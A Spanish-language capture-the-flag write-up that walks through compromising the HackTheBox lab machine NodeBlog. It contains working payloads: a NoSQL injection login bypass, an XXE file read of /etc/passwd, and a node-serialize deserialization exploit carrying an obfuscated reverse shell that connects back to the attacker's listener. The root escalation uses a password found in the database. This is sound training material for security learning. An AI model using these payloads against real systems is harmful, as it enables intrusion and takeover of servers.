---
layout: single
title: NodeBlog HTB - WriteUp
excerpt: WriteUp de la máquina NodeBlog de HTB.
date: 2023-03-15
classes: wide
header:
  teaser: /assets/images/NodeBlog/NodeBlog.png
  teaser_home_page: true
  icon: /assets/images/NodeBlog/NodeBlog.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Web
  - NoSQL
  - XXE                                                                                                                                                                                    
  - Deserialization
  - Data-Exposure
  - Mongo
---


En el día de hoy estaremos resolviendo la máquina NodeBlog de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.11.139.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Web Username Enumeration](#web-username-enumeration)
3. [Bypass Login NoSQL Injection](#bypass-login-nosql-injection)
4. [XXE Read Files](#xxe-read-files)
5. [Sensitive Data Exposure](#sensitive-data-exposure)
6. [Deserialization Attack](#deserialization-attack)
7. [Privesc](#privesc)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p22,5000 10.10.11.139
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-15 12:09 CET
Nmap scan report for 10.10.11.139
Host is up (0.055s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Podemos ver dos servicios expuestos, un servidor SSH y un servidor web alojado en el puerto 5000. En el escaneo podemos ver que el servidor usa Node.js, vamos a usar la herramienta whatweb para ver las tecnologías que usa la web.

```bash
❯ whatweb http://10.10.11.139:5000/
http://10.10.11.139:5000/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.139], Script[JavaScript], Title[Blog], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

Podemos ver que se está usando express... Vamos a entrar en la web para ver que nos enccontramos.

### Web Username Enumeration

Podemos ver un blog, el cual nos permite ver artícculos y hacer login, Voy a capturar con burpsuite la petición de login.

![](/assets/images/NodeBlog/img1.png)

Podemos ver que nos pone que el usuario es incorrecto, pero si probamos a poner como usuario admin, nos dice que la password es invalida.

![](/assets/images/NodeBlog/img2.png)


### Bypass Login NoSQL Injection

Tenemos una vía potencial de enumerar usuarios. Pero antes de esto vamos a probar inyecciones básicas. Ninguna inyección mas o menos básica funcionó en este punto lo que hice fue cambiar el cuerpo a formato JSON y probar a enviar los datos.

![](/assets/images/NodeBlog/img3.png)

Si probamos una inyección NoSQL veremos que nos saltamos el login. El payload utilizado fue el siguiente:


```json
{"user":{"$ne": null},"password":{"$ne": null}}
```


![](/assets/images/NodeBlog/img4.png)

Vamos a irnos al navegador para ver que funciones tenemos. Tenemos que añadir la cookie para entrar en la sesión.

![](/assets/images/NodeBlog/img5.png)

Vemos que ahora podemos realizar nuevas acciones. Entre ellas:

- Crear artículos.
- Subir artículos.
- Modificar y borrar artículos.

### XXE Read Files

Si intentamos subir algo a "Upload" (yo he probado subir una image) podemos ver el siguiente error.

```
Invalid XML Example: Example DescriptionExample Markdown
```

Si miramos el código fuente podemos ver la estructura XML

```xml
Invalid XML Example: <post><title>Example Post</title><description>Example Description</description><markdown>Example Markdown</markdown></post>
```

Conociendo la estructura XML podememos intentar hacer un ataque XXE para leer archivos en el servidor, ejecutar comandos... etc

Vamos a crear nuestro archivo XML malicioso.

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<post>
        <title>b</title>
        <description>l</description>
        <markdown>&xxe;</markdown>

</post>
```

Voy a intentar leer el archivo passwd de la máquina víctima. Voy a capturar la petición con burpsuite para ir modificado el fichero desde ahí.

![](/assets/images/NodeBlog/img6.png)

Podemos ver el fichero... ¿Qué hacemos ahora? Podemos intentar leer las claves privadas de SSH de los usuarios (solo hay dos que usen bash: root y admin). Si lo intentamos, veremos que no da resultado. En este punto tenemos que retroceder unos pasos hasta el login. 



###  Sensitive Data Exposure

Hay veces que ocasionar un error en la aplicación es de utilidad porque nos puede revelar información, como rutas, claves... En este caso si tratamos de enviar los datos en JSON mal estructurados podemos generar un error que nos revela las rutas del servidor web.

![](/assets/images/NodeBlog/img7.png)

Podemos ver la ruta donde esta montado el blog -> "/opt/blog" como todo esta montado con node vamos a tratar de leer el código principal de la aplicación. El archivo se suele llamar "server.js"

```js
const express = require(&#39;express&#39;)
const mongoose = require(&#39;mongoose&#39;)
const Article = require(&#39;./models/article&#39;)
const articleRouter = require(&#39;./routes/articles&#39;)
const loginRouter = require(&#39;./routes/login&#39;)
const serialize = require(&#39;node-serialize&#39;)
const methodOverride = require(&#39;method-override&#39;)
const fileUpload = require(&#39;express-fileupload&#39;)
const cookieParser = require(&#39;cookie-parser&#39;);
const crypto = require(&#39;crypto&#39;)
const cookie_secret = &#34;UHC-SecretCookie&#34;
//var session = require(&#39;express-session&#39;);
const app = express()

mongoose.connect(&#39;mongodb://localhost/blog&#39;)

app.set(&#39;view engine&#39;, &#39;ejs&#39;)
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride(&#39;_method&#39;))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: &#34;UHC-SecretKey-123&#34;}));

function authenticated(c) {
    if (typeof c == &#39;undefined&#39;)
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash(&#39;md5&#39;).update(cookie_secret + c.user).digest(&#39;hex&#39;)) ){
        return true
    } else {
        return false
    }
}


app.get(&#39;/&#39;, async (req, res) =&gt; {
    const articles = await Article.find().sort({
        createdAt: &#39;desc&#39;
    })
    res.render(&#39;articles/index&#39;, { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use(&#39;/articles&#39;, articleRouter)
app.use(&#39;/login&#39;, loginRouter)


app.listen(5000)
```


###  Deserialization Attack


Podemos ver que se está usando la función unserealize, podemos ver secretos y como se firma la cookie.

Si nos fijamos en la cookie, podemos ver que sigue la siguiente etructura.

```
--Formato-URL-- 
%7B%22user%22%3A%7B%22%24ne%22%3Anull%7D%2C%22sign%22%3A%224b7029c2a4ed7527255315fc356bf082%22%7D

--Decodeada--
{"user":{"$ne":null},"sign":"4b7029c2a4ed7527255315fc356bf082"}
```

Podemos ver que lo que se esta almacenando en la cookie se deserializa. Podemos aprovecharnos de esto debido a que podemos introducir lo que queramos con las cookies. Voy a explicar de una forma rapida como funciona la deserialización y serialización en NodeJS

Vamos a tener dos archivos. Uno para serializar que será este:

```js
var y = {
rce : function(){
require('child_process').exec('id', function(error,
stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

```

Si tratamos de ejecutar ese archivo con node podemos ver los datos serializados.

```bash
❯ node test.js
Serialized: 
{"rce":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('id', function(error,\nstdout, stderr) { console.log(stdout) });\n}"}
```

¿Cómo podemos aprovecharnos de esto? Bien si nos fijamos en este otro fichero podemos ver lo siguiente:

```js
var y = {
rce : function(){
require('child_process').exec('id', function(error,
stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Aparentemente igual podemos ver que se han añadido unos () si ejecutamos el script podemos ver lo siguiente:

```bash
❯ node test2.js
Serialized: 
{}
uid=0(root) gid=0(root) grupos=0(root)
```

Se ha ejecutado el comando que habiamos serealizado. Vamos a probar si ocurre lo mismo deserealizando:

```js
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'id \',function(error, stdout, stderr) { console.log(stdout)});}()"}';
serialize.unserialize(payload);
```

Le hos añadido los parentesis al final de la data serializada. Vamos a ejecutar el script. Sabiendo esto vamos a aprovecharnos  para ejecutar comandos en el servidor. Usaré este script que me generará un payload para establecerme una revshell.
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

Lo ejecutamos y nos quedae el siguiente payload.

```bash
❯ python2 nodejsshell.py 10.10.16.6 443
[+] LHOST = 10.10.16.4
[+] LPORT = 443
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,52,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

Ahora tenemos que generar nuestra data serializada:

```bash
❯ cat revshell
{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,54,46,52,34,59,10,80,79,82,84,61,34,52,52,51,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}
```

Podemos ver los "()" al final del payload para que cuando en el servidor se deserialicen los datos se ejecute la revshell. Vamos a hacer el encode en formato url y le pasaremos el payload al servidor a través de la cookie.

![](/assets/images/NodeBlog/img8.png)


Si miramos nuestro listener podemos ver que tenemos una shell.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
10.10.11.139: inverse host lookup failed: Unknown host
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.139] 43494
Connected!
id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```


###  Privesc

Vamos a hacer el tratamiento de la tty y vamos a tratar de escalar privilegios. Vamos a enumerar la base de datos mongo que se estaba ejecutando.

```bash
admin@nodeblog:/opt/blog$ mongo
MongoDB shell version v3.6.8
connecting to: mongodb://127.0.0.1:27017
Implicit session: session { "id" : UUID("4b582cbb-f716-4fe9-ad09-1b659dba7704") }
MongoDB server version: 3.6.8
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
        http://docs.mongodb.org/
Questions? Try the support group
        http://groups.google.com/group/mongodb-user
2023-03-15T16:40:07.690+0000 I STORAGE  [main] In File::open(), ::open for '/home/admin/.mongorc.js' failed with Permission denied
Server has startup warnings: 
2023-03-15T15:14:59.241+0000 I CONTROL  [initandlisten] 
2023-03-15T15:14:59.241+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2023-03-15T15:14:59.241+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2023-03-15T15:14:59.241+0000 I CONTROL  [initandlisten] 
2023-03-15T16:40:07.692+0000 E -        [main] Error loading history file: FileOpenFailed: Unable to fopen() file /home/admin/.dbshell: Permission denied
```

Vamos a ver las bases de datos disponibles.

```bash
> show dbs
admin   0.000GB
blog    0.000GB
config  0.000GB
local   0.000GB
> use blog
```

Estamos usando la base de datos blog, vamos a ver si hay tablas (collections)

```bash
> show collections
articles
users
```

Vamos a ver el contenido de users:

```bash
> db.users.find()
{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
> 

```

Vemos una password, comprobaremos si sirve para autenticarnos como otro usuario o es nuesta.

```bash
admin@nodeblog:/opt/blog$ sudo -l
[sudo] password for admin: 
Matching Defaults entries for admin on nodeblog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
admin@nodeblog:/opt/blog$
```

La contraseña era nuestra y si miramos los permisos de sudo vemos que podemso ejecutar cualquier comando como root.

```bash
admin@nodeblog:/opt/blog$ sudo su
root@nodeblog:/opt/blog# id
uid=0(root) gid=0(root) groups=0(root)
root@nodeblog:/opt/blog#
```

Ya hemos pwneado la máquina! Espero que te haya servido.






















